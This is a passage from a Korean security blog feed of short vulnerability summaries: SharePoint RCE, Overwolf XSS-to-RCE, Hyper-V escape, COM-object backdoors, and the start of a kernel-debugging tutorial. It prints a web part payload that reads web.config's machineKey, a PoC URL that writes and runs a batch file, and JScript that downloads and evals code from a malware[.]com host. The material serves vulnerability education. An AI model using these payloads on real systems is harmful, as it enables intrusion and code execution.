<span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">{6e7040c8-0338-4448-914d-a7061e0fc347}</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>&#xB530;&#xB77C;&#xC11C; <code>web.config</code>&#xC758; machinekey section&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; <code>ViewState</code>&#xAC00; deserialize &#xB420; &#xB54C; &#xC784;&#xC758;&#xC758; OS &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; <code>VIEWSTATE</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
    <link href="/2021/06/02/fabu1ous/2021-06-02/"/>
    <url>/2021/06/02/fabu1ous/2021-06-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Overwolf&#xB294; PC &#xAC8C;&#xC784;&#xC744; &#xC704;&#xD55C; &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xAC1C;&#xBC1C; &#xD504;&#xB798;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC720;&#xD1B5;&#xD558;&#xB294; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;. Overwolf Store&#xC758; URL handler&#xC5D0; Reflected Cross-Site Scripting(XSS)&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs url">overwolfstore://app/apps/&lt;img src=x onerror=alert(document.location)&gt;/4</code></pre><p><code>overwolfstore://</code> Custum Scheme&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC6F9;&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xD1B5;&#xD574; OverwolfAppstore.exe &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. URL&#xC758; category&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC624;&#xB958; &#xBA54;&#xC138;&#xC9C0;&#xC758; &#xC77C;&#xBD80;&#xB85C; responce body&#xC5D0; reflect &#xB418;&#xBA70; Overwolf Store UI&#xC758; DOM&#xC5D0; reflect &#xB418;&#xBBC0;&#xB85C; XSS &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs url">overwolfstore://app/apps/&lt;img+src=x+onerror=%22overwolf.io.writeFileContents(&apos;C:\\windows\\temp\\d.bat&apos;,&apos;start%20cmd%20%252fk%20whoami&apos;,&apos;&apos;,false,console.log)%2526overwolf.utils.openUrlInDefaultBrowser(&apos;C:\\windows\\temp\\d.bat&apos;)%22&gt;/CCCCCC</code></pre><p>&#xC704;&#xB294; PoC &#xCF54;&#xB4DC;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB204;&#xAD70;&#xAC00; &#xC545;&#xC131; URL&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Overwolf Store &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; XSS &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;.</li><li><code>C:\windows\temp\</code> &#xD3F4;&#xB354;&#xC5D0; &#xC545;&#xC131; batch &#xD30C;&#xC77C; &#xC0DD;&#xC131;.</li><li>batch &#xD30C;&#xC77C; &#xC2E4;&#xD589;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28476: Microsoft Hyper-V의 Guest-to-Host RCE 취약점</title>
    <link href="/2021/06/01/l0ch/2021-06-01/"/>
    <url>/2021/06/01/l0ch/2021-06-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-28476">CVE-2021-28476: a guest-to-host &#x201C;Microsoft Hyper-V Remote Code Execution Vulnerability&#x201D; in vmswitch.sys.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Hyper-V</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xC758; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xAE30;&#xBC18; &#xAC00;&#xC0C1;&#xD654; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; Hyper-V&#xC5D0;&#xC11C; &#xAC8C;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC774; &#xD638;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; escape &#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD638;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC758; <code>vmswitch.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. <code>vmswitch.sys</code>&#xB294; &#xAC00;&#xC0C1; &#xD30C;&#xD2F0;&#xC158;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD30C;&#xD2F0;&#xC158; &#xAC04; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xCC44;&#xB110; &#xAE30;&#xBC18; &#xD1B5;&#xC2E0; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC778; <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-architecture">VMBus</a> &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. <code>vmswitch.sys</code>&#xC758; <code>VmsIfrInfoParams_OID_SWITCH_NIC_REQUEST</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC6D0;&#xACA9; <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/network/remote-ndis--rndis-2">NDIS(RNDIS)</a>  &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xB370;, &#xAC8C;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xC545;&#xC131; RNDIS &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB85C; &#xD638;&#xCD9C;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD638;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC774; &#xAC8C;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC5ED;&#xCC38;&#xC870; &#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; Hyper-V&#xC5D0; Ubuntu focal &#xAC8C;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>hyper-v</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] COM 객체를 활용한 백도어</title>
    <link href="/2021/05/31/idioth/2021-05-31/"/>
    <url>/2021/05/31/idioth/2021-05-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/maltrak/com-objects-p-1-the-hidden-backdoor-in-your-system-947ac4285e85">COM Objects P.1: The Hidden Backdoor in Your System</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC9C0;&#xB09C; &#xBA87; &#xB144;&#xAC04;, &#xD574;&#xCEE4;&#xB4E4;&#xC740; COM Object&#xC744; &#xD1B5;&#xD574; fileless attack, defense &#xC6B0;&#xD68C;, &#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; RPC &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB0B4;&#xBD80;&#xC5D0; &#xCE68;&#xD22C;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB4E4;&#xC774; COM &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; Initial Access&#xB97C; &#xC704;&#xD55C; COM &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. COM Scriptlet&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB098; VBScript&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>COM&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; Scriptlet &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8;&#xB85C; Shell&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span>&lt;![CDATA[<span class="javascript"><span class="hljs-keyword">var</span> malware = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).Run(<span class="hljs-string">&quot;powershell.exe ...&quot;</span>);</span>]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><code>ActiveXObject</code>&#xB97C; &#xD1B5;&#xD574; <code>WScript.Shell</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xADF8; &#xB2E4;&#xC74C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs js">net = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);net.Open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://malware[.]com/malware.js&quot;</span>, <span class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NET&#xC758; Serialization&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC704;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>&#xB97C; <code>ActiveXObject</code>&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xAC1D;&#xCCB4;&#xB97C; base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xD560; &#xC218; &#xC788;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xBA54;&#xC778; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>&#xB97C; &#xD1B5;&#xD574; &#xC27D;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>backdoor</tag>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>com</tag>
      
      <tag>vbscript</tag>
      
      <tag>jscript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 1 - Setting Up Kernel Debugging</title>
    <link href="/2021/05/30/l0ch/windows-driver/"/>
    <url>/2021/05/30/l0ch/windows-driver/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging                            &#x2190; Now!</p><p><a href="https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1)</a></p><p><a href="http://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2)</a></p><p><a href="http://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3)</a></p><hr><h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C;&#xBC88; pwn cool sexy &#xC2DC;&#xB9AC;&#xC988;&#xC5D0; &#xC774;&#xC5B4; &#xC0C8;&#xB85C;&#xC6B4; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!  &#xADF8; &#xC0AC;&#xC774;&#xC5D0; &#xAE30;&#xB9D0;&#xACE0;&#xC0AC; &#xAE30;&#xAC04;&#xC774; &#xB41C; &#xAC74; &#xB364;.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>&#xACFC;&#xAC70;&#xC758; &#xB098;&#xC57C;.. &#xB108; &#xAE30;&#xB9D0;&#xB3C4; &#xB9DD;&#xD588;&#xC5B4;</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>&#xAD50;&#xC218;&#xB2D8; &#xC885;&#xAC15;&#xC880;&#xC694;&#x3160;&#x3160;&#x3160;</p><p>&#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC744; &#xBCF4;&#xB2E4; &#xBCF4;&#xBA74; &#xAF64; &#xC790;&#xC8FC; &#xB098;&#xC624;&#xB294; Windows third-party driver&#xC758; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>&#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC544;&#xB2D8;&#x314E;&#x314E;;</p></blockquote><p>&#xC608;&#xC2DC;&#xB97C; &#xD558;&#xB098; &#xB4E4;&#xC5B4;&#xBCF4;&#xC790;&#xBA74;.. &#xCD5C;&#xADFC; &#xC774;&#xC288;&#xAC00; &#xB41C; Dell&#xC758; BIOS &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xB098;&#xC628; <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[&#xD558;&#xB8E8;&#xD55C;&#xC904;] CVE-2021-21551: &#xC218;&#xC5B5; &#xB300;&#xC758; Dell PC&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; </a> &#xC815;&#xB3C4;&#xAC00; &#xC788;&#xACA0;&#xB124;&#xC694;. &#xB300;&#xCDA9; &#xC2EC;&#xAC01;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xAC74; &#xC54C;&#xACA0;&#xB294;&#xB370; IOCTL&#xC740; &#xBB50;&#xACE0;&#x2026; <code>EPROCESS</code>? &#xD1A0;&#xD070;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xB36E;&#xC5B4; &#xC4F4;&#xB2E4;&#xB294; &#xAC74;&#xC9C0; &#xB610; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xD55C;&#xB2E4;&#xB294; &#xAC74;&#xC9C0;.. &#xC815;&#xB9D0; &#xBAA8;&#xB974;&#xB294; &#xC6A9;&#xC5B4;, &#xAC1C;&#xB150; &#xD22C;&#xC131;&#xC774;&#xB124;&#xC694;. &#xACF5;&#xBD80;&#xD560;&#xAC8C; &#xB108;&#xBB34; &#xB9CE;&#xC9C0;&#xB9CC; &#x3160;&#x3160;&#x3160; &#xD558;&#xB098;&#xC529; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; &#xC5B8;&#xC820;&#xAC00;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744;&#xC218;&#xB3C4; &#xC788;&#xACA0;&#xC8E0;?</p><p>&#xC624;&#xB298;&#xC740; &#xC2DC;&#xB9AC;&#xC988; &#xCCAB; &#xAE00;&#xC774;&#xB2C8; &#xAC00;&#xBCCD;&#xAC8C; &#xB514;&#xBC84;&#xAE45; &#xD658;&#xACBD; &#xC138;&#xD305;&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xC55E;&#xC73C;&#xB85C; &#xAC04;&#xB2E8;&#xD55C; exploit &#xC608;&#xC81C;&#xB97C; &#xB2E4;&#xB8E8;&#xACE0;, one-day &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB05D;&#xC73C;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xB3C4; &#xAE38;&#xC5B4;&#xC9C8; &#xAC83; &#xAC19;&#xC740; &#xC608;&#xAC10;&#xC774; &#xB4DC;&#xB294; &#xAC74;.. &#xAE30;&#xBD84; &#xD0D3;&#xC778;&#xAC00;..?</p><h1 id="&#xC900;&#xBE44;"><a href="#&#xC900;&#xBE44;" class="headerlink" title="&#xC900;&#xBE44;"></a>&#xC900;&#xBE44;</h1><p>&#xC6B0;&#xC120; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305;&#xBD80;&#xD130; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB2EC;&#xB9AC; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC644;&#xC804;&#xD788; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC774; &#xB9CE;&#xC8E0;. &#xADF8;&#xB798;&#xC11C;! &#xBCF4;&#xD1B5;&#xC740; &#xC6D0;&#xACA9;&#xC9C0; PC&#xB97C; &#xD558;&#xB098; &#xAD6C;&#xC131;&#xD574; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC138;&#xD305;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC804;&#xC5D0;&#xB294; named pipe&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAC00;&#xC0C1; &#xC2DC;&#xB9AC;&#xC5BC; &#xD3EC;&#xD2B8;&#xB85C; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD588;&#xC9C0;&#xB9CC; &#xC2DC;&#xB9AC;&#xC5BC; &#xD3EC;&#xD2B8; &#xC18D;&#xB3C4;&#xC758; &#xD55C;&#xACC4;&#xB85C; KDNET &#xB124;&#xD2B8;&#xC6CC;&#xD06C; 